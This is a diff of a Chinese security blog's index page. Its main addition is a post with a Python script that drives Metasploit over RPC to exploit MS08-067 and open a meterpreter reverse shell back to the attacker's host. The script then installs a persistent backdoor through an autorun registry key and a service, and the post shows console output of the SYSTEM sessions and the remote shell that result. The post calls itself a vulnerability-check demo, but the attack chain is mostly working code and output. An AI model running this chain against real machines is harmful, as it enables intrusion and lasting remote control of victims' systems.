@@ -184,6 +184,91 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Demo-MSF检测指定服务的漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/sec/Demo-MSF检测指定服务的漏洞/">[Demo] MSF检测指定服务的漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/sec/Demo-MSF检测指定服务的漏洞/" class="archive-article-date">
+  	<time datetime="2016-08-11T15:00:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#相关资源</p>
+<blockquote>
+<p> <a href="https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc" target="_blank" rel="external">SpiderLabs/msfrpc</a></p>
+</blockquote>
+<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">用MSF检测指定服务的漏洞</div><div class="line">本脚本以 MS08-067为例</div><div class="line">'''</div><div class="line"></div><div class="line">__author__ = <span class="string">"SanNa"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> msfrpc</div><div class="line"><span class="keyword">import</span> optparse</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line"></div><div class="line">LOGIN = <span class="string">'msf'</span></div><div class="line">PASSWD = <span class="string">'abc123'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">builder</span><span class="params">(RHOST, LHOST, LPORT)</span>:</span></div><div class="line">    <span class="string">'''根据相关信息创建文件</span></div><div class="line"></div><div class="line">    :param RHOST: 目标ip</div><div class="line">    :param LHOST: 监听IP</div><div class="line">    :param LPORT: 监听端口</div><div class="line"></div><div class="line">    '''</div><div class="line">    postcomms = <span class="string">"""getsystem</span></div><div class="line">            run persistence -S -U -X -i 10 -p 80 -r """+LHOST+<span class="string">"""</span></div><div class="line">            cd c:\\</div><div class="line">            upload /tmp/ms08067_patch.exe c:\\</div><div class="line">            upload /tmp/ms08067_install.bat c:\\</div><div class="line">            execute -f ms08067_install.bat</div><div class="line">            """</div><div class="line">    batcomm = <span class="string">"ms08067_patch.exe /quiet"</span></div><div class="line">    <span class="keyword">with</span> open (<span class="string">'/tmp/smbpost.rc'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> post, open(<span class="string">'/tmp/ms08067_install.bat'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> bat:</div><div class="line">        post.write(postcomms)</div><div class="line">        bat.write(batcomm)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sploiter</span><span class="params">(RHOST, LHOST, LPORT, session)</span>:</span></div><div class="line">    <span class="string">'''连接到msfconsole</span></div><div class="line"></div><div class="line">    :param RHOST: 目标ip</div><div class="line">    :param LHOST: 监听IP</div><div class="line">    :param LPORT: 监听端口</div><div class="line">    :param session: session</div><div class="line"></div><div class="line">    '''</div><div class="line">    client = msfrpc.Msfrpc(&#123;&#125;)</div><div class="line">    client.login(LOGIN, PASSWD)</div><div class="line">    ress = client.call(<span class="string">'console.create'</span>)</div><div class="line">    console_id = ress[<span class="string">'id'</span>]</div><div class="line"></div><div class="line">    <span class="comment"># Exploit MS08-067</span></div><div class="line">    commands = <span class="string">"""use exploit/windows/smb/ms08_067_netapi</span></div><div class="line">                set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">                set RHOST """+RHOST+<span class="string">"""</span></div><div class="line">                set LHOST """+LHOST+<span class="string">"""</span></div><div class="line">                set LPORT """+LPORT+<span class="string">"""</span></div><div class="line">                set ExitOnSession false</div><div class="line">                exploit -z</div><div class="line">            """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Exploiting MS08-067 on: "</span> + RHOST</div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,commands])</div><div class="line">    res = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line">    result = res[<span class="string">'data'</span>].split(<span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># 运行攻击脚本</span></div><div class="line">    runPost = <span class="string">"""use post/multi/gather/run_console_rc_file</span></div><div class="line">                set RESOURCE /tmp/smbpost.rc</div><div class="line">                set SESSION """+session+<span class="string">"""</span></div><div class="line">                exploit</div><div class="line">              """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Running post-exploit script on: "</span> + RHOST</div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,runPost])</div><div class="line">    rres = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line"></div><div class="line">    <span class="comment">#Setup Listener for presistent connection back over port 80</span></div><div class="line">    sleep(<span class="number">10</span>)</div><div class="line">    listen = <span class="string">"""use exploit/multi/handler</span></div><div class="line">            set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">            set LPORT 80</div><div class="line">            set LHOST """+LHOST+<span class="string">"""</span></div><div class="line">            exploit</div><div class="line">            """</div><div class="line">    <span class="keyword">print</span> <span class="string">"[+] Setting up listener on: "</span> + LHOST + <span class="string">":80"</span></div><div class="line">    client.call(<span class="string">'console.write'</span>,[console_id,listen])</div><div class="line">    lres = client.call(<span class="string">'console.read'</span>,[console_id])</div><div class="line">    <span class="keyword">print</span> lres</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser = optparse.OptionParser(sys.argv[<span class="number">0</span>] +\</div><div class="line">            <span class="string">' -p LPORT -r RHOST -l LHOST -s session'</span>)</div><div class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'LPORT'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help =<span class="string">'specify a port to listen on'</span>)</div><div class="line">    parser.add_option(<span class="string">'-r'</span>, dest=<span class="string">'RHOST'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help=<span class="string">'Specify a remote host'</span>)</div><div class="line">    parser.add_option(<span class="string">'-l'</span>, dest=<span class="string">'LHOST'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help=<span class="string">'Specify a local host'</span>)</div><div class="line">    parser.add_option(<span class="string">'-s'</span>, dest=<span class="string">'session'</span>, type=<span class="string">'string'</span>, \</div><div class="line">            help =<span class="string">'specify session ID'</span>)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    session=options.session</div><div class="line">    RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (RHOST == <span class="keyword">None</span>) <span class="keyword">and</span> (LPORT == <span class="keyword">None</span>) <span class="keyword">and</span> (LHOST == <span class="keyword">None</span>):</div><div class="line">        <span class="keyword">print</span> parser.usage</div><div class="line">        sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">    builder(RHOST, LHOST, LPORT)</div><div class="line">    sploiter(RHOST, LHOST, LPORT, session)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h1 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  ~  python 333msf.py -p 4444 -r 192.168.1.43 <span class="_">-l</span> 192.168.1.8 <span class="_">-s</span> 8</div><div class="line">[+] Exploiting MS08-067 on: 192.168.1.43</div><div class="line">[+] Running post-exploit script on: 192.168.1.43</div><div class="line">[+] Setting up listener on: 192.168.1.8:80</div><div class="line">[&#123;<span class="string">"prompt"</span>: <span class="string">"\u0001\u0002msf\u0001\u0002 post(\u0001\u0002\u0001\u0002run_console_rc_file\u0001\u0002) \u0001\u0002&gt; "</span>, <span class="string">"busy"</span>: <span class="literal">true</span>, <span class="string">"data"</span>: <span class="string">"PAYLOAD =&gt; windows/meterpreter/reverse_tcp\nRHOST =&gt; 192.168.1.43\nLHOST =&gt; 192.168.1.8\nLPORT =&gt; 4444\nExitOnSession =&gt; false\n[*] Started reverse TCP handler on 192.168.1.8:4444 \n[*] Automatically detecting the target...\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability...\n[*] Sending stage (957487 bytes) to 192.168.1.43\n[*] Meterpreter session 8 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1139) at 2016-06-03 21:13:38 +0800\n[*] Session 8 created in the background.\nRESOURCE =&gt; /tmp/smbpost.rc\nSESSION =&gt; 7\n[*] Running module against DH-CA8822AB9589\n[*] Running command getsystem\n[*] Running command                 run persistence -S -U -X -i 10 -p 80 -r 192.168.1.8\n"</span>&#125;]</div></pre></td></tr></table></figure>
+<h1 id="执行脚本时msf端命令行回显"><a href="#执行脚本时msf端命令行回显" class="headerlink" title="执行脚本时msf端命令行回显"></a>执行脚本时msf端命令行回显</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[*] Running Persistance Script</div><div class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf7/logs/persistence/DH-CA8822AB9589_20160603.2703/DH-CA8822AB9589_20160603.2703.rc</div><div class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=80</div><div class="line">[*] Persistent agent script is 148419 bytes long</div><div class="line">[+] Persistent Script written to C:\WINDOWS\TEMP\IezQttslf.vbs</div><div class="line">[*] Executing script C:\WINDOWS\TEMP\IezQttslf.vbs</div><div class="line">[+] Agent executed with PID 2720</div><div class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DIwbwLlJMJ</div><div class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DIwbwLlJMJ</div><div class="line">[*] Installing as service..</div><div class="line">[*] Creating service YsimPwZAk</div><div class="line">[*] Meterpreter session 3 opened (192.168.1.8:80 -&gt; 192.168.1.43:1083) at 2016-06-03 18:27:06 +0800</div></pre></td></tr></table></figure>
+<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf &gt; sessions</div><div class="line"></div><div class="line">Active sessions</div><div class="line">===============</div><div class="line"></div><div class="line">  Id  Type                   Information                                      Connection</div><div class="line">  --  ----                   -----------                                      ----------</div><div class="line">  7   meterpreter x86/win32  DH-CA8822AB9589\Administrator @ DH-CA8822AB9589  192.168.1.8:80 -&gt; 192.168.1.43:1138 (192.168.1.43)</div><div class="line">  8   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ DH-CA8822AB9589            192.168.1.8:4444 -&gt; 192.168.1.43:1139 (192.168.1.43)</div><div class="line"></div><div class="line"></div><div class="line">msf &gt; sessions -i 8</div><div class="line">[*] Starting interaction with 6...</div></pre></td></tr></table></figure>
+<h1 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; sysinfo</div><div class="line">Computer        : DH-CA8822AB9589</div><div class="line">OS              : Windows XP (Build 2600, Service Pack 3).</div><div class="line">Architecture    : x86</div><div class="line">System Language : en_US</div><div class="line">Domain          : WORKGROUP</div><div class="line">Logged On Users : 2</div><div class="line">Meterpreter     : x86/win32</div><div class="line">meterpreter &gt; shell</div><div class="line">Process 3492 created.</div><div class="line">Channel 1 created.</div><div class="line">Microsoft Windows XP [Version 5.1.2600]</div><div class="line">(C) Copyright 1985-2001 Microsoft Corp.</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator&gt;ipconfig</div><div class="line">ipconfig</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line"></div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">        Connection-specific DNS Suffix  . :</div><div class="line">        IP Address. . . . . . . . . . . . : 192.168.1.43</div><div class="line">        Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">        Default Gateway . . . . . . . . . : 192.168.1.1</div><div class="line"></div><div class="line">C:\Documents and Settings\Administrator&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/sec/" class="article-tag-list-link color4">sec</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/sec/Demo-MSF检测指定服务的漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-Test-MS08-067" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1242,83 +1327,6 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-kali-install-VPN-Client" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/others/kali-install-VPN-Client/">Kali install VPN Client</a>
-    </h1>
-  
-
-        
-        <a href="/others/kali-install-VPN-Client/" class="archive-article-date">
-  	<time datetime="2016-03-20T12:05:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-03-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">apt-get install network-manager-openvpn-gnome</div><div class="line">apt-get install network-manager-pptp</div><div class="line">apt-get install network-manager-pptp-gnome</div><div class="line">apt-get install network-manager-strongswan</div><div class="line">apt-get install network-manager-vpnc</div><div class="line">apt-get install network-manager-vpnc-gnome</div><div class="line">/etc/init.d/network-manager restart</div><div class="line"></div><div class="line">如果连接不上请注意VPN协议，连接PPTP协议可以试试将高级——使用点对点加密和发送PPP回响包勾选。</div></pre></td></tr></table></figure>
-<blockquote>
-<p>Kali 2.0源列表</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">deb http://http.kali.org/kali sana main non-free contrib</div><div class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/others/" class="article-tag-list-link color2">others</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/others/kali-install-VPN-Client/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
@@ -1404,6 +1412,14 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">虚拟化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">OSSEC</a>
               </li>
              
@@ -1417,14 +1433,6 @@ var _hmt = _hmt || [];
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Metasploit</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">虚拟化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1444,19 +1452,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Node.js</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">OSSIM</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">SQL Server</a>
+                <a href="javascript:void(0)" class="js-tag color3">Node.js</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1468,7 +1468,15 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">机器学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL Server</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1480,15 +1488,19 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Solr</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">others</a>
+                <a href="javascript:void(0)" class="js-tag color3">前端</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">前端</a>
+                <a href="javascript:void(0)" class="js-tag color2">others</a>
               </li>
              
               <li class="article-tag-list-item">
